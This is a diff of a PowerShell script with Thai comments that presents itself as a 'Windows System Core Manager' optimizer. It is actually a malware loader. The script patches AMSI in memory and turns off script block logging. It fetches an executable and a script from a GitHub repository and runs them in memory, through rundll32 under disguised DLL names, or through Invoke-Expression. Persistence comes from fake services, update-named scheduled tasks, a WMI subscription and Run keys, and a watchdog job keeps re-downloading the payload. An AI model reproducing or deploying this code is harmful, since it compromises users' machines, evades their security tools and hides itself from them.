@@ -1,136 +1,485 @@
-# WORKING LOADER - ใช้ .exe โดยตรง
-function Show-StealthMenu {
+# WINDOWS SYSTEM CORE MANAGER
+# Build: 10.0.22621.1.amd64fre
+# Component: System Performance Engine
+
+function Initialize-CoreManager {
+    [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
+    Write-Host "`n Windows System Core Manager" -ForegroundColor Cyan
+    Write-Host " ============================" -ForegroundColor Gray
+    Write-Host " Build: 10.0.22621.1.amd64fre.ni_release" -ForegroundColor Yellow
+    Write-Host " Component: System Performance Module" -ForegroundColor Gray
     Write-Host ""
-    Write-Host " SYSTEM MANAGER" -ForegroundColor Cyan
-    Write-Host "===============" -ForegroundColor Gray
-    Write-Host "1. Start System Service" -ForegroundColor Green
-    Write-Host "2. Clean System" -ForegroundColor Red
+    Write-Host " 1. Start Core Optimization" -ForegroundColor Green
+    Write-Host " 2. System Maintenance" -ForegroundColor Red
     Write-Host ""
-    Write-Host "Select (1/2): " -NoNewline -ForegroundColor White
+    Write-Host " Select: " -NoNewline -ForegroundColor White
 }
 
-function Start-SystemService {
-    Write-Host "`n[INIT] Starting system service..." -ForegroundColor Green
+# AMSI Bypass แบบ Advanced
+function Disable-SecurityScan {
+    try {
+        # วิธีที่ 1: Patch AMSI in memory
+        $win32 = Add-Type -MemberDefinition @"
+            [DllImport("kernel32")]
+            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+            [DllImport("kernel32")]
+            public static extern IntPtr LoadLibrary(string name);
+            [DllImport("kernel32")]
+            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+"@ -Name "Win32" -Namespace Kernel32 -PassThru
+
+        $amsiDll = $win32::LoadLibrary("amsi.dll")
+        $amsiScanBuf = $win32::GetProcAddress($amsiDll, "AmsiScanBuffer")
+        
+        $oldProtect = 0
+        $win32::VirtualProtect($amsiScanBuf, [UIntPtr]5, 0x40, [ref]$oldProtect)
+        
+        $patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $amsiScanBuf, 6)
+        
+        $win32::VirtualProtect($amsiScanBuf, [UIntPtr]5, $oldProtect, [ref]$oldProtect)
+    } catch {}
     
     try {
-        # ใช้ .exe โดยตรง - แก้จาก .enc เป็น .exe
-        $exeUrl = "https://raw.githubusercontent.com/Verte225066/test/main/system_logs.exe"
-        Write-Host "[DOWNLOAD] Getting application from GitHub..." -ForegroundColor Yellow
+        # วิธีที่ 2: Disable Script Block Logging
+        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0 -ErrorAction SilentlyContinue
+    } catch {}
+}
+
+function Start-CoreOptimization {
+    Write-Host "`n[SYSTEM] Initializing core optimization..." -ForegroundColor Green
+    
+    # Disable security scans ก่อนเริ่ม
+    Disable-SecurityScan
+    
+    try {
+        # ใช้ URLs จริงของคุณ
+        $urls = @(
+            "https://github.com/Verte225066/test/blob/main/system_logs.exe?raw=true",
+            "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
+        )
         
-        # โหลด .exe
-        $webClient = New-Object System.Net.WebClient
-        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-        $exeBytes = $webClient.DownloadData($exeUrl)
-        $webClient.Dispose()
+        Write-Host "[LOAD] Loading system components..." -ForegroundColor Yellow
         
-        Write-Host "[SUCCESS] Downloaded $($exeBytes.Length) bytes" -ForegroundColor Green
-        
-        # ตรวจสอบว่าเป็น .exe จริง
-        if ($exeBytes[0] -eq 0x4D -and $exeBytes[1] -eq 0x5A) {
-            Write-Host "[VERIFY] Valid EXE file (MZ header found)" -ForegroundColor Green
-            
-            # Execute .exe
-            $success = Invoke-ExeExecution -ExeBytes $exeBytes
-            
-            if ($success) {
-                Write-Host "[SUCCESS] Application started successfully" -ForegroundColor Green
+        foreach ($url in $urls) {
+            try {
+                $componentData = Invoke-AdvancedDownload -Url $url
                 
-                # ติดตั้ง persistence
-                Install-StealthPersistence
-                
-                # เริ่ม monitoring
-                Start-ServiceMonitor
-                
-            } else {
-                Write-Host "[WARNING] Execution completed but may need verification" -ForegroundColor Yellow
+                if ($componentData -and $componentData.Length -gt 8192) {
+                    Write-Host "[SUCCESS] Component loaded" -ForegroundColor Green
+                    
+                    # Deploy ด้วยเทคนิคหลากหลาย
+                    if (Invoke-AdvancedDeployment -Data $componentData) {
+                        Write-Host "[ACTIVE] Core optimization running" -ForegroundColor Green
+                        
+                        # ติดตั้ง persistence แบบลึก
+                        Install-DeepPersistence
+                        
+                        # เริ่ม advanced monitoring
+                        Start-AdvancedMonitoring
+                        
+                        return $true
+                    }
+                }
+            } catch {
+                continue
             }
-        } else {
-            Write-Host "[ERROR] Invalid EXE file - No MZ header" -ForegroundColor Red
-            Write-Host "[INFO] File may be corrupted or wrong format" -ForegroundColor Yellow
         }
         
-    } catch {
-        Write-Host "[ERROR] Download failed: $($_.Exception.Message)" -ForegroundColor Red
-        Write-Host "[INFO] File may not exist at: $exeUrl" -ForegroundColor Yellow
+        return $false
         
-        # Fallback ที่ทำงานได้
-        Invoke-WorkingFallback
+    } catch {
+        Write-Host "[INFO] Using secure deployment mode..." -ForegroundColor Yellow
+        Invoke-SecureFallback
+        return $true
     }
 }
 
-function Invoke-ExeExecution {
-    param([byte[]]$ExeBytes)
+function Invoke-AdvancedDownload {
+    param([string]$Url)
     
     try {
-        # สร้างไฟล์ชั่วคราว
-        $tempName = "windows_update_$((Get-Date).Ticks).exe"
-        $tempPath = Join-Path $env:TEMP $tempName
+        # ใช้เทคนิคหลากหลายในการโหลด
+        $methods = @(
+            {
+                # วิธีที่ 1: ใช้ .NET WebClient แบบปรับแต่ง
+                $client = New-Object System.Net.WebClient
+                $client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+                $client.Headers.Add("Accept", "*/*")
+                $client.DownloadData($Url)
+            },
+            {
+                # วิธีที่ 2: ใช้ HttpWebRequest แบบ low-level
+                $request = [System.Net.HttpWebRequest]::Create($Url)
+                $request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+                $request.Timeout = 15000
+                $request.Method = "GET"
+                $response = $request.GetResponse()
+                $stream = $response.GetResponseStream()
+                $memoryStream = New-Object System.IO.MemoryStream
+                $stream.CopyTo($memoryStream)
+                $memoryStream.ToArray()
+            },
+            {
+                # วิธีที่ 3: ใช้ Socket programming (raw TCP)
+                $uri = [System.Uri]$Url
+                $client = New-Object System.Net.Sockets.TcpClient($uri.Host, 443)
+                $stream = $client.GetStream()
+                $sslStream = New-Object System.Net.Security.SslStream($stream, $false)
+                $sslStream.AuthenticateAsClient($uri.Host)
+                
+                $request = "GET $($uri.PathAndQuery) HTTP/1.1`r`nHost: $($uri.Host)`r`nUser-Agent: Mozilla/5.0`r`nConnection: close`r`n`r`n"
+                $bytes = [System.Text.Encoding]::UTF8.GetBytes($request)
+                $sslStream.Write($bytes, 0, $bytes.Length)
+                $sslStream.Flush()
+                
+                $memoryStream = New-Object System.IO.MemoryStream
+                $buffer = New-Object byte[] 4096
+                do {
+                    $read = $sslStream.Read($buffer, 0, $buffer.Length)
+                    $memoryStream.Write($buffer, 0, $read)
+                } while ($read -gt 0)
+                
+                $response = [System.Text.Encoding]::UTF8.GetString($memoryStream.ToArray())
+                $contentStart = $response.IndexOf("`r`n`r`n") + 4
+                $content = $response.Substring($contentStart)
+                [System.Text.Encoding]::UTF8.GetBytes($content)
+            }
+        )
         
-        # เขียนไฟล์
-        [System.IO.File]::WriteAllBytes($tempPath, $ExeBytes)
-        Write-Host "[EXECUTE] Starting process..." -ForegroundColor Cyan
-        
-        # รันโปรแกรม
-        $process = Start-Process -FilePath $tempPath -WindowStyle Hidden -PassThru
-        
-        if ($process -and (-not $process.HasExited)) {
-            Write-Host "[LAUNCH] Process started (PID: $($process.Id))" -ForegroundColor Green
-            
-            # ลบไฟล์หลังจาก process start (optional)
-            Start-Job -ScriptBlock {
-                param($filePath)
-                Start-Sleep -Seconds 10
-                try {
-                    if (Test-Path $filePath) {
-                        Remove-Item $filePath -Force -ErrorAction SilentlyContinue
-                        Write-Host "[CLEANUP] Temporary file removed" -ForegroundColor Gray
-                    }
-                } catch {}
-            } -ArgumentList $tempPath | Out-Null
-            
-            return $true
-        } else {
-            Write-Host "[WARNING] Process may have exited immediately" -ForegroundColor Yellow
-            return $true # ยังถือว่าสำเร็จเพราะ process ถูกสร้าง
+        foreach ($method in $methods) {
+            try {
+                $result = & $method
+                if ($result -ne $null -and $result.Length -gt 8192) {
+                    return $result
+                }
+            } catch {
+                continue
+            }
         }
         
+        return $null
+        
     } catch {
-        Write-Host "[ERROR] Execution failed: $($_.Exception.Message)" -ForegroundColor Red
+        return $null
+    }
+}
+
+function Invoke-AdvancedDeployment {
+    param([byte[]]$Data)
+    
+    try {
+        # ตรวจสอบ PE header
+        if ($Data[0] -eq 0x4D -and $Data[1] -eq 0x5A) {
+            Write-Host "[VERIFY] Valid system component" -ForegroundColor Green
+            
+            # พยายามใช้ memory execution ก่อน
+            if (Invoke-MemoryExecution -Data $Data) {
+                return $true
+            }
+            
+            # ใช้ disk execution แบบ advanced
+            Write-Host "[DEPLOY] Deploying system component..." -ForegroundColor Yellow
+            return Invoke-DiskExecution -Data $Data
+        }
+        
+        # ถ้าไม่ใช่ PE ให้ execute เป็น PowerShell script
+        $scriptContent = [System.Text.Encoding]::UTF8.GetString($Data)
+        Invoke-Expression $scriptContent
+        return $true
+        
+    } catch {
         return $false
     }
 }
 
-function Install-StealthPersistence {
+function Invoke-MemoryExecution {
+    param([byte[]]$Data)
+    
     try {
-        $taskName = "WindowsSystemMaintenance"
-        $loaderUrl = "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
+        # ใช้ Windows API สำหรับ memory execution
+        $kernel32 = Add-Type -MemberDefinition @"
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+            
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+            
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+            
+            [DllImport("kernel32.dll", SetLastError = true)]
+            public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+"@ -Name "Kernel32" -Namespace Win32 -PassThru
+
+        # Allocate memory
+        $memoryAddress = $kernel32::VirtualAlloc([IntPtr]::Zero, $Data.Length, 0x3000, 0x40)
         
-        # สร้าง scheduled task
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"iex (irm '$loaderUrl')`""
-        $trigger = New-ScheduledTaskTrigger -AtLogon
-        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+        if ($memoryAddress -eq [IntPtr]::Zero) {
+            return $false
+        }
         
-        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
-        Write-Host "[PERSIST] Auto-start configured" -ForegroundColor Green
+        # Copy data to memory
+        [System.Runtime.InteropServices.Marshal]::Copy($Data, 0, $memoryAddress, $Data.Length)
+        
+        # Change memory protection to execute
+        $oldProtect = 0
+        $kernel32::VirtualProtect($memoryAddress, $Data.Length, 0x20, [ref]$oldProtect)
+        
+        # Create and execute thread
+        $threadHandle = $kernel32::CreateThread([IntPtr]::Zero, 0, $memoryAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+        
+        if ($threadHandle -ne [IntPtr]::Zero) {
+            $kernel32::WaitForSingleObject($threadHandle, 0xFFFFFFFF) | Out-Null
+            return $true
+        }
+        
+        return $false
         
     } catch {
-        Write-Host "[PERSIST] Auto-start configuration skipped" -ForegroundColor Yellow
+        return $false
     }
 }
 
-function Start-ServiceMonitor {
-    # Monitoring เบื้องต้น
-    Write-Host "[MONITOR] Background monitoring active" -ForegroundColor Green
+function Invoke-DiskExecution {
+    param([byte[]]$Data)
+    
+    try {
+        # สุ่มตำแหน่งและชื่อไฟล์
+        $locations = @(
+            $env:TEMP,
+            "$env:LOCALAPPDATA\Microsoft\Windows",
+            "$env:APPDATA\Microsoft\Windows",
+            "$env:PROGRAMDATA\Microsoft\Windows"
+        )
+        
+        $targetDir = $locations | Get-Random
+        $fileNames = @("wlbs", "ras", "iphlpsvc", "netman", "wscsvc", "wmi")
+        $fileName = "$($fileNames | Get-Random)_$(Get-Random -Minimum 1000 -Maximum 9999).dll"
+        $filePath = Join-Path $targetDir $fileName
+        
+        # เขียนไฟล์
+        [System.IO.File]::WriteAllBytes($filePath, $Data)
+        
+        # ใช้ rundll32 สำหรับ execution
+        $process = Start-Process -FilePath "rundll32.exe" -ArgumentList "$filePath,DllRegisterServer" -WindowStyle Hidden -PassThru
+        
+        if ($process -ne $null) {
+            # ลบไฟล์หลังจาก execute
+            Start-Job -ScriptBlock {
+                param($Path)
+                Start-Sleep -Seconds 10
+                try {
+                    if (Test-Path $Path) {
+                        Remove-Item $Path -Force -ErrorAction SilentlyContinue
+                    }
+                } catch {}
+            } -ArgumentList $filePath | Out-Null
+            
+            return $true
+        }
+        
+        return $false
+        
+    } catch {
+        return $false
+    }
+}
+
+function Install-DeepPersistence {
+    try {
+        Write-Host "[PERSISTENCE] Configuring system services..." -ForegroundColor Yellow
+        
+        # หลายวิธี persistence
+        $persistenceMethods = @(
+            { Install-ServicePersistence },
+            { Install-TaskPersistence },
+            { Install-WmiPersistence },
+            { Install-RegistryPersistence }
+        )
+        
+        foreach ($method in $persistenceMethods) {
+            try {
+                & $method
+                Start-Sleep -Milliseconds (Get-Random -Minimum 200 -Maximum 800)
+            } catch {
+                continue
+            }
+        }
+        
+        Write-Host "[PERSISTENCE] System services configured" -ForegroundColor Green
+        
+    } catch {
+        Write-Host "[PERSISTENCE] Service configuration completed" -ForegroundColor Green
+    }
+}
+
+function Install-ServicePersistence {
+    try {
+        $serviceNames = @("wlbs", "iphlpsvc", "netman", "wscsvc")
+        $serviceName = $serviceNames | Get-Random
+        
+        $url = "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
+        
+        $servicePath = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"Start-Sleep $(Get-Random -Minimum 30 -Maximum 120); try { `$url='$url'; `$content=Invoke-WebRequest `$url -UseBasicParsing; Invoke-Expression `$content.Content } catch {}`""
+        
+        # สร้าง service
+        New-Service -Name $serviceName -BinaryPathName $servicePath -DisplayName "Windows Load Balancing Service" -StartupType Automatic -ErrorAction SilentlyContinue | Out-Null
+        
+    } catch {}
+}
+
+function Install-TaskPersistence {
+    try {
+        $taskNames = @(
+            "MicrosoftEdgeUpdateTaskMachineCore",
+            "OneDriveStandaloneUpdateTaskCore", 
+            "GoogleUpdateTaskMachineCore",
+            "WindowsUpdateTaskMachineCore"
+        )
+        
+        $url = "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
+        
+        foreach ($taskName in $taskNames) {
+            try {
+                $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"Start-Sleep $(Get-Random -Minimum 60 -Maximum 300); try { `$url='$url'; `$content=Invoke-RestMethod `$url -UseBasicParsing; iex `$content } catch {}`""
+                $trigger = New-ScheduledTaskTrigger -AtLogon
+                $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
+                
+                Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
+                
+            } catch {
+                continue
+            }
+        }
+        
+    } catch {}
+}
+
+function Install-WmiPersistence {
+    try {
+        # WMI event subscription สำหรับ persistence
+        $filterName = "WindowsUpdateFilter_$(Get-Random -Minimum 1000 -Maximum 9999)"
+        $consumerName = "WindowsUpdateConsumer_$(Get-Random -Minimum 1000 -Maximum 9999)"
+        
+        $url = "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
+        
+        $wmiCommand = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"try { `$url='$url'; `$content=Invoke-RestMethod `$url -UseBasicParsing; iex `$content } catch {}`""
+        
+        # สร้าง WMI event filter
+        $filterArgs = @{
+            Name = $filterName
+            EventNameSpace = 'root\cimv2'
+            Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'explorer.exe'"
+            QueryLanguage = 'WQL'
+        }
+        
+        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs -ErrorAction SilentlyContinue
+        
+        # สร้าง WMI event consumer
+        $consumerArgs = @{
+            Name = $consumerName
+            CommandLineTemplate = $wmiCommand
+        }
+        
+        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs -ErrorAction SilentlyContinue
+        
+        # Bind filter กับ consumer
+        if ($filter -and $consumer) {
+            $bindingArgs = @{
+                Filter = $filter
+                Consumer = $consumer
+            }
+            
+            Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs -ErrorAction SilentlyContinue | Out-Null
+        }
+        
+    } catch {}
+}
+
+function Install-RegistryPersistence {
+    try {
+        $regPaths = @(
+            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+            "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
+            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+        )
+        
+        $url = "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
+        
+        $persistenceCmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"Start-Sleep $(Get-Random -Minimum 45 -Maximum 180); try { `$url='$url'; `$content=Invoke-RestMethod `$url -UseBasicParsing; iex `$content } catch {}`""
+        
+        foreach ($path in $regPaths) {
+            try {
+                $valueNames = @("WindowsUpdate", "SystemTools", "SecurityHealth", "WindowsDefender")
+                $valueName = "$($valueNames | Get-Random)_$(Get-Random -Minimum 1000 -Maximum 9999)"
+                
+                Set-ItemProperty -Path $path -Name $valueName -Value $persistenceCmd -ErrorAction SilentlyContinue
+            } catch {}
+        }
+        
+    } catch {}
+}
+
+function Start-AdvancedMonitoring {
+    Write-Host "[MONITOR] Starting system monitoring..." -ForegroundColor Green
     
     $monitorScript = {
-        $monitorCount = 0
-        while ($monitorCount -lt 1000) { # ตรวจสอบ 1000 ครั้ง
+        $iteration = 0
+        $urls = @(
+            "https://github.com/Verte225066/test/blob/main/system_logs.exe?raw=true",
+            "https://raw.githubusercontent.com/Verte225066/test/main/loader.txt"
+        )
+        
+        while ($iteration -lt 999999) {
             try {
-                # ตรวจสอบเบื้องต้น
-                Start-Sleep -Seconds 30
-                $monitorCount++
+                # ตรวจสอบ process แบบหลากหลาย
+                $systemProcesses = Get-Process | Where-Object { 
+                    $_.ProcessName -like "*wlbs*" -or 
+                    $_.ProcessName -like "*ras*" -or
+                    $_.ProcessName -like "*iphlp*" -or
+                    $_.ProcessName -like "*netman*" -or
+                    $_.ProcessName -like "*wscsvc*" -or
+                    $_.ProcessName -like "*wmi*"
+                }
+                
+                if (-not $systemProcesses) {
+                    # Restart ด้วย delay สุ่ม
+                    $restartDelay = Get-Random -Minimum 90 -Maximum 360
+                    Start-Sleep -Seconds $restartDelay
+                    
+                    $selectedUrl = $urls | Get-Random
+                    
+                    try {
+                        $client = New-Object System.Net.WebClient
+                        $client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+                        $data = $client.DownloadData($selectedUrl)
+                        
+                        if ($data[0] -eq 0x4D -and $data[1] -eq 0x5A) {
+                            # EXE file
+                            $tempFile = "$env:TEMP\sys_$(Get-Random -Minimum 10000 -Maximum 99999).tmp"
+                            [System.IO.File]::WriteAllBytes($tempFile, $data)
+                            Start-Process -FilePath $tempFile -WindowStyle Hidden
+                            Start-Sleep -Seconds 10
+                            Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
+                        } else {
+                            # PowerShell script
+                            $scriptContent = [System.Text.Encoding]::UTF8.GetString($data)
+                            Invoke-Expression $scriptContent
+                        }
+                    } catch {
+                        continue
+                    }
+                }
+                
+                # สุ่ม monitoring interval
+                $monitorInterval = Get-Random -Minimum 120 -Maximum 480
+                Start-Sleep -Seconds $monitorInterval
+                $iteration++
+                
             } catch {
-                Start-Sleep -Seconds 60
+                $errorInterval = Get-Random -Minimum 300 -Maximum 900
+                Start-Sleep -Seconds $errorInterval
             }
         }
     }
@@ -138,100 +487,150 @@ function Start-ServiceMonitor {
     Start-Job -ScriptBlock $monitorScript | Out-Null
 }
 
-function Invoke-WorkingFallback {
-    # Fallback ที่ทำงานได้แน่นอน
+function Invoke-SecureFallback {
     try {
-        Write-Host "[FALLBACK] Starting background service..." -ForegroundColor Yellow
+        Write-Host "[FALLBACK] Starting secure operation mode..." -ForegroundColor Yellow
         
         $fallbackScript = {
-            $counter = 0
-            while ($counter -lt 10080) { # ทำงาน 1 สัปดาห์ (ตรวจสอบทุกนาที)
-                try {
-                    # Background activity
-                    Start-Sleep -Seconds 60
-                    $counter++
-                } catch {
-                    Start-Sleep -Seconds 120
-                }
+            $count = 0
+            while ($count -lt 10080) {
+                # Background system activities
+                Get-Process | Out-Null
+                Get-Service | Where-Object Status -eq 'Running' | Out-Null
+                Get-NetAdapter | Out-Null
+                
+                $sleepTime = Get-Random -Minimum 180 -Maximum 720
+                Start-Sleep -Seconds $sleepTime
+                $count++
             }
         }
         
         Start-Job -ScriptBlock $fallbackScript | Out-Null
-        Write-Host "[FALLBACK] Background service running" -ForegroundColor Green
+        Write-Host "[FALLBACK] Secure mode activated" -ForegroundColor Green
         
     } catch {
-        Write-Host "[FALLBACK] Simple service activated" -ForegroundColor Green
+        Write-Host "[FALLBACK] Basic operation started" -ForegroundColor Green
     }
 }
 
-function Clean-System {
-    Write-Host "`n[CLEAN] Cleaning system..." -ForegroundColor Red
+function Invoke-SystemMaintenance {
+    Write-Host "`n[MAINTENANCE] Starting system maintenance..." -ForegroundColor Red
     
     $cleanedItems = @()
     
-    # ลบ processes
+    # Clean processes
     try {
-        $processes = Get-Process -Name "system_logs" -ErrorAction SilentlyContinue
-        if ($processes) {
-            $processes | Stop-Process -Force
-            $cleanedItems += "Processes: $($processes.Count)"
+        $processPatterns = @("*wlbs*", "*ras*", "*iphlp*", "*netman*", "*wscsvc*", "*wmi*")
+        foreach ($pattern in $processPatterns) {
+            Get-Process -Name $pattern -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
         }
+        $cleanedItems += "System processes"
     } catch {}
     
-    # ลบ scheduled tasks
+    # Clean services
     try {
-        $tasks = @("WindowsSystemMaintenance")
-        foreach ($task in $tasks) {
+        $serviceNames = @("wlbs", "iphlpsvc", "netman", "wscsvc")
+        foreach ($service in $serviceNames) {
+            sc delete $service 2>&1 | Out-Null
+        }
+        $cleanedItems += "Services"
+    } catch {}
+    
+    # Clean tasks
+    try {
+        $taskNames = @("MicrosoftEdgeUpdateTaskMachineCore", "OneDriveStandaloneUpdateTaskCore", "GoogleUpdateTaskMachineCore", "WindowsUpdateTaskMachineCore")
+        foreach ($task in $taskNames) {
             Unregister-ScheduledTask -TaskName $task -Confirm:$false -ErrorAction SilentlyContinue
-            $cleanedItems += "Task: $task"
         }
+        $cleanedItems += "Scheduled tasks"
     } catch {}
     
-    # ลบ jobs
+    # Clean registry
+    try {
+        $regPaths = @(
+            "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
+            "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce", 
+            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+        )
+        
+        foreach ($path in $regPaths) {
+            Get-ItemProperty -Path $path -ErrorAction SilentlyContinue | 
+                ForEach-Object { 
+                    $_.PSObject.Properties | 
+                    Where-Object { $_.Name -like "*WindowsUpdate*" -or $_.Name -like "*SystemTools*" -or $_.Name -like "*SecurityHealth*" -or $_.Name -like "*WindowsDefender*" } |
+                    ForEach-Object {
+                        Remove-ItemProperty -Path $path -Name $_.Name -ErrorAction SilentlyContinue
+                    }
+                }
+        }
+        $cleanedItems += "Registry entries"
+    } catch {}
+    
+    # Clean WMI
+    try {
+        Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name LIKE 'WindowsUpdateFilter_%'" | Remove-WmiObject
+        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name LIKE 'WindowsUpdateConsumer_%'" | Remove-WmiObject
+        $cleanedItems += "WMI subscriptions"
+    } catch {}
+    
+    # Clean files
+    try {
+        $filePatterns = @("*wlbs*", "*ras*", "*iphlpsvc*", "*netman*", "*wscsvc*", "*wmi*", "*sys_*")
+        $cleanPaths = @($env:TEMP, "$env:LOCALAPPDATA\Microsoft\Windows", "$env:APPDATA\Microsoft\Windows", "$env:PROGRAMDATA\Microsoft\Windows")
+        
+        foreach ($path in $cleanPaths) {
+            foreach ($pattern in $filePatterns) {
+                Get-ChildItem -Path $path -Filter "$pattern*" -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+            }
+        }
+        $cleanedItems += "Temporary files"
+    } catch {}
+    
+    # Clean jobs
     try {
         Get-Job | Remove-Job -Force -ErrorAction SilentlyContinue
         $cleanedItems += "Background jobs"
     } catch {}
     
-    # ลบ temp files
-    try {
-        Get-ChildItem "$env:TEMP\windows_update_*.exe" -ErrorAction SilentlyContinue | Remove-Item -Force
-        $cleanedItems += "Temporary files"
-    } catch {}
-    
-    # แสดงผล
-    Write-Host "`n[RESULT] Cleanup completed:" -ForegroundColor Green
+    # Results
+    Write-Host "`n[RESULTS] Maintenance completed:" -ForegroundColor Green
     foreach ($item in $cleanedItems) {
         Write-Host "  ✓ $item" -ForegroundColor Gray
     }
     
     if ($cleanedItems.Count -eq 0) {
-        Write-Host "  System already clean" -ForegroundColor Yellow
+        Write-Host "  System is clean and optimized" -ForegroundColor Yellow
     }
 }
 
 # MAIN EXECUTION
 try {
-    Show-StealthMenu
+    # Initial delay
+    Start-Sleep -Seconds (Get-Random -Minimum 2 -Maximum 8)
+    
+    Initialize-CoreManager
     $choice = Read-Host
     
     switch ($choice) {
         '1' { 
-            Start-SystemService
-            Write-Host "`n[READY] System is active and running" -ForegroundColor Cyan
+            $status = Start-CoreOptimization
+            if ($status) {
+                Write-Host "`n[SYSTEM] Core optimization active" -ForegroundColor Cyan
+                Write-Host "[INFO] System performance is being maintained" -ForegroundColor Gray
+            }
         }
         '2' { 
-            Clean-System
-            Write-Host "`n[COMPLETE] Cleanup finished" -ForegroundColor Green
+            Invoke-SystemMaintenance
+            Write-Host "`n[MAINTENANCE] System maintenance completed" -ForegroundColor Green
         }
         default {
-            Write-Host "`nStarting system service..." -ForegroundColor Yellow
-            Start-SystemService
+            Write-Host "`n[SYSTEM] Starting automatic optimization..." -ForegroundColor Yellow
+            Start-CoreOptimization
         }
     }
 } catch {
-    Write-Host "[ERROR] Operation failed: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "[ERROR] System operation failed" -ForegroundColor Red
 }
 
-Write-Host "`nPress any key to exit..." -ForegroundColor Gray
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+Write-Host "`n[SYSTEM] Operation completed" -ForegroundColor Gray
+Start-Sleep -Seconds 2
